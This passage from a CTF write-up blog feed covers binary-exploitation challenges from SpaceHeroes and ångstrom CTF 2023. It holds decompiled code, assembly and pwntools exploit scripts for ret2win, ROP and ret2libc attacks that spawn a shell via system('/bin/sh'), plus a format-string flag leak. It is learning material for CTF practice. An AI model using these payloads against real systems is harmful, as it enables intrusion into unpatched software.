class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *choice; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">void</span> (*v6)(<span class="type">void</span>); <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_terminal();</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v6();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &gt; <span class="number">3</span> );</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print_choice();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;choice);</span><br><span class="line">      <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int64)choice )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))alderaan;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))yavin_4;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))dantoine;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))tatooine;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))dagobah;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))hoth;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))bespin;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))choice;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Target Coordinates =&gt; %ld\n&quot;</span>, v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>v6</code>Ïóê Ìï®ÏàòÌè¨Ïù∏ÌÑ∞Î•º Îã¥Í≥† <code>v5</code>Í∞Ä 2Ïùº Îïå <code>v6</code>ÏùÑ Ï∂úÎ†•Ìï¥Ï§ÄÎã§. Í∑∏Î¶¨Í≥† <code>v5</code>Í∞Ä 3Ïùº Îïå <code>v6();</code>ÏùÑ ÌÜµÌï¥ Ïù¥ Î≥ÄÏàòÏóê Ï†ÄÏû•Îêú Ï£ºÏÜåÎ•º Ïã§ÌñâÌïúÎã§. Í∞ÄÏû• Ï§ëÏöîÌïú Í≤ÉÏùÄ ÏûÖÎ†•Í∞íÏù¥ <code>v6</code>Ïóê Ï†ÄÏû•ÎêúÎã§Îäî ÏÇ¨Ïã§Ïù¥Îã§. Ïù¥Í≤ÉÏùÑ ÌÜµÌï¥ ÏõêÌïòÎäî Ï£ºÏÜåÎ•º Ïã§ÌñâÌï† Ïàò ÏûàÎã§.</p><p>ÎßàÏπ® <code>win()</code> Ìï®ÏàòÍ∞Ä ÏûàÎã§.</p><img src="/images/230428-superheroesctf2023-Death-Star-Targeting-Computer/Screenshot 2023-04-28 at 18.25.13.png" width=500/><br><p>Ïù¥Î†áÍ≤å IDAÍ∞Ä Îπ®Í∞ÑÏÉâÏúºÎ°ú Î≥ÄÏàòÎ•º ÌëúÏãúÌïòÎ©¥ Ïñ¥ÏÖàÎ∏îÎ¶¨Î•º Î≥¥ÎùºÎäî ÎúªÏù¥Îã§. Ïñ¥ÏÖàÎ∏îÎ¶¨Î•º ÏÇ¥Ìé¥Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><img src="/images/230428-superheroesctf2023-Death-Star-Targeting-Computer/Screenshot 2023-04-28 at 18.38.38.png" width=300/><br><p>Ïñ¥ÏÖàÎ∏îÎ¶¨Ïóê Ï†ÅÌòÄÏûàÎäî Í≤ÉÏ≤òÎüº Î≥ÄÏàòÎ•º ÎßûÏ∂∞Ï£ºÎ©¥ ÎêòÎäîÎç∞ Ïù¥Îäî Îã§Î•∏ Ìï®ÏàòÎì§ÏùÑ ÌÜµÌï¥ÏÑú ÏâΩÍ≤å ÎßûÏ∂∞Ï§Ñ Ïàò ÏûàÎã§. Î¨∏Ï†ú Ï†úÏûëÏûêÍ∞Ä ÏπúÏ†àÌïòÍ≤å Îã§ ÎÑ£Ïñ¥Ï£ºÏóàÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000151B ; __unwind &#123;</span><br><span class="line">.text:000000000000151B                 push    rbp</span><br><span class="line">.text:000000000000151C                 mov     rbp, rsp</span><br><span class="line">.text:000000000000151F                 mov     r14, 4Bh ; &#x27;K&#x27;</span><br><span class="line">.text:0000000000001526                 retn</span><br><span class="line">.text:0000000000001526 _Z9ignore_mev   endp ; sp-analysis failed</span><br><span class="line">.text:0000000000001526</span><br><span class="line">.text:0000000000001527</span><br><span class="line">.text:0000000000001527 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000001527</span><br><span class="line">.text:0000000000001527</span><br><span class="line">.text:0000000000001527 ; void sub_1527()</span><br><span class="line">.text:0000000000001527 sub_1527        proc near</span><br><span class="line">.text:0000000000001527                 mov     r13, 56h ; &#x27;V&#x27;</span><br><span class="line">.text:000000000000152E                 retn</span><br><span class="line">.text:000000000000152E sub_1527        endp</span><br><span class="line">.text:000000000000152E</span><br><span class="line">.text:000000000000152F</span><br><span class="line">.text:000000000000152F ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:000000000000152F</span><br><span class="line">.text:000000000000152F</span><br><span class="line">.text:000000000000152F ; void sub_152F()</span><br><span class="line">.text:000000000000152F sub_152F        proc near</span><br><span class="line">.text:000000000000152F                 mov     r15, 135h</span><br><span class="line">.text:0000000000001536                 retn</span><br><span class="line">.text:0000000000001536 sub_152F        endp</span><br></pre></td></tr></table></figure><p>Îã§Îßå <code>151B</code> Ï£ºÏÜåÏóê ÏûàÎäî <code>push rbp</code>Îäî Ïã§ÌñâÏãúÌÇ§Î©¥ ÏïàÎêúÎã§. </p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;spaceheroes-death-star.chals.io&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;spaceheroes-death-star.chals.io&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./death_star_computer.bin&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./death_star_computer.bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;=&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) - <span class="number">0x136B</span></span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x1527</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x152f</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x151F</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x153a</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;y0u_m4y_f1re_wh3n_re4dy&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/230427-angstromctf2023-queue/"/>
      <url>/230427-angstromctf2023-queue/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>√•ngstrom CTF 2023 review</title>
      <link href="/230427-angstromctf2023-0review/"/>
      <url>/230427-angstromctf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><p>I like this CTF because the difficulty level is right for me. (The difficulty of the challenges ranges from simple to hard.) And this CTF has a longer duration than others.</p><img src="/images/230427-angstromctf2023-0review/Screenshot 2023-04-27 at 15.22.47.png" width=700/><br><p>I want to solve <code>noleek</code>. But I couldn‚Äôt find how to use vulnerability for exploit. It turns out I didn‚Äôt understand about vulnerability. Although this CTF is over, I‚Äôll solve this challenge.</p><p>I could find <code>FSB</code> vulnerabilities in most of the challenges. It was great chance for opportunity of practice exploiting <code>FSB</code> vulnerabilities.</p><p>Actually I participated in this CTF last year, and I remeber having fun. So I think I was able to participate in fun in this time as well :)</p><ul><li><a href="http://jiravvit.github.io/230427-angstromctf2023-1.queue/">http://jiravvit.github.io/230427-angstromctf2023-1.queue/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-2.gaga/">http://jiravvit.github.io/230427-angstromctf2023-2.gaga/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-3.leek/">http://jiravvit.github.io/230427-angstromctf2023-3.leek/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-4.widget/">http://jiravvit.github.io/230427-angstromctf2023-4.widget/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-5.slack/">http://jiravvit.github.io/230427-angstromctf2023-5.slack/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>√•ngstrom CTF 2023 - gaga (simple rop)</title>
      <link href="/230427-angstromctf2023-2.gaga/"/>
      <url>/230427-angstromctf2023-2.gaga/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>Multipart challenge!<br>Note all use essentially the same Dockerfile. The flags are split among all three challenges. If you are already a pwn expert, the last challenge has the entire flag.<br><code>nc challs.actf.co 31300</code> gaga0<br><code>nc challs.actf.co 31301</code> gaga1<br><code>nc challs.actf.co 31302</code> gaga2 Dockerfile<br>Author: JoshDaBosh</p></blockquote><ul><li>[219 solves &#x2F; 70 points]</li></ul><p>Actually, I was able to find the flag when I only solved <code>gaga2</code>.</p><h2 id="gaga0"><a href="#gaga0" class="headerlink" title="gaga0"></a>gaga0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>I can find <code>bof</code> from <code>gets()</code>. And there are <code>win()</code> too. Just simple ret2win.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./gaga0&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31300</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gaga0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x401236</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="gaga1"><a href="#gaga1" class="headerlink" title="gaga1"></a>gaga1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>It is same as <code>gaga0</code> But, This <code>win()</code> needs arguments to call.</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./gaga1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31301</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gaga1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4013b3</span></span><br><span class="line">pop_rsi = <span class="number">0x4013b1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x1337</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x4141</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret) + p64(<span class="number">0x401236</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="gaga2"><a href="#gaga2" class="headerlink" title="gaga2"></a>gaga2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>The difference between <code>gaga2</code> and <code>gaga1</code> is the existence of the <code>win()</code>. But Just do ret2libc.</p><h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./gaga2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31302</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gaga2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4012b3</span></span><br><span class="line">pop_rsi = <span class="number">0x4013b1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(ret) </span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;libc base &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;b4by&#x27;s_f1rst_pwn!_3857ffd6bfdf775e&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>√•ngstrom CTF 2023 - queue (fsb, flag leak)</title>
      <link href="/230427-angstromctf2023-1.queue/"/>
      <url>/230427-angstromctf2023-1.queue/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>I just learned about stacks and queues in DSA!<br><code>nc challs.actf.co 31322</code></p></blockquote><ul><li>[333 solves &#x2F; 40 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+4h] [rbp-CCh]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">48</span>]; <span class="comment">// [rsp+10h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+40h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+C8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: missing flag.txt.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">128</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What did you learn in class today? &quot;</span>);</span><br><span class="line">  fgets(format, <span class="number">48</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Oh nice, &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);   <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sounds pretty cool!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I find simple <code>fsb</code> vulnerability. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@<span class="built_in">arch</span> 1.queue]$ nc challs.actf.co 31322</span><br><span class="line">What did you learn <span class="keyword">in</span> class today? %14<span class="variable">$p</span> %15<span class="variable">$p</span> %16<span class="variable">$p</span> %17<span class="variable">$p</span> %18<span class="variable">$p</span> %19<span class="variable">$p</span> %20<span class="variable">$p</span></span><br><span class="line">Oh <span class="built_in">nice</span>, 0x3474737b66746361 0x75715f74695f6b63 0x615f74695f657565 0x3437396461393136 0x7d32326234363863 (nil) (nil)</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 